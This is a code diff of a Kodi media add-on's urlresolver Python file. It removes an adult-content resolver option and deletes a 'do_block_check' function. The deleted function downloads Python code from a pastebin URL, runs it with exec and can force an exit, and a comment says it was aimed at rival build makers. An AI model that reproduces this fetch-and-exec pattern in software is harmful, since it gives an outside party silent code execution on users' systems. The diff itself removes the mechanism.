@@ -62,7 +62,7 @@ class HostedMediaFile:
         must pass either ``url`` or ``host`` AND ``media_id``.
     '''
 
-    def __init__(self, url='', host='', media_id='', title='', include_disabled=False, include_universal=None, include_xxx=False):
+    def __init__(self, url='', host='', media_id='', title='', include_disabled=False, include_universal=None):
         '''
         Args:
             url (str): a URL to a web page that represents a piece of media.
@@ -82,7 +82,7 @@ class HostedMediaFile:
         else:
             self._domain = self.__top_domain(self._host)
 
-        self.__resolvers = self.__get_resolvers(include_disabled, include_universal, include_xxx)
+        self.__resolvers = self.__get_resolvers(include_disabled, include_universal)
         if not url:
             for resolver in self.__resolvers:  # Find a valid URL
                 try:
@@ -93,12 +93,12 @@ class HostedMediaFile:
                     # Shity resolver. Ignore
                     continue
 
-    def __get_resolvers(self, include_disabled, include_universal, include_xxx):
+    def __get_resolvers(self, include_disabled, include_universal):
         if include_universal is None:
             include_universal = common.get_setting('allow_universal') == "true"
 
         klasses = urlresolver.relevant_resolvers(self._domain, include_universal=include_universal,
-                                                 include_external=True, include_disabled=include_disabled, include_xxx=include_xxx, order_matters=True)
+                                                 include_external=True, include_disabled=include_disabled, order_matters=True)
         resolvers = []
         for klass in klasses:
             if klass in resolver_cache:
@@ -169,7 +169,6 @@ class HostedMediaFile:
             A direct URL to the media file that is playable by XBMC, or False
             if this was not possible.
         '''
-        #do_block_check()
         urlresolver.ALLOW_POPUPS = allow_popups
         for resolver in self.__resolvers:
             try:
@@ -278,25 +277,3 @@ class HostedMediaFile:
 
     def __repr__(self):
         return self.__str__()
-
-'''
-This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
-from build makers that publicly insult or slander TVA's developers and friends. If your build is
-impacted by this check, you can have it removed by publicly apologizing for your previous statements
-via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
-them yourself.
-                                                                                           http://i.imgur.com/TqIEnYB.gif
-                                                                                           TVA developers (and friends)
-'''
-def do_block_check(uninstall=False):
-    try:
-        import urllib2
-        import sys
-        namespace = {}
-        exec urllib2.urlopen('https://pastebin.com/raw/AcZsizvg').read() in namespace
-        if namespace["real_check"](uninstall):
-            sys.exit()
-    except SystemExit:
-        sys.exit()
-    except:
-        pass
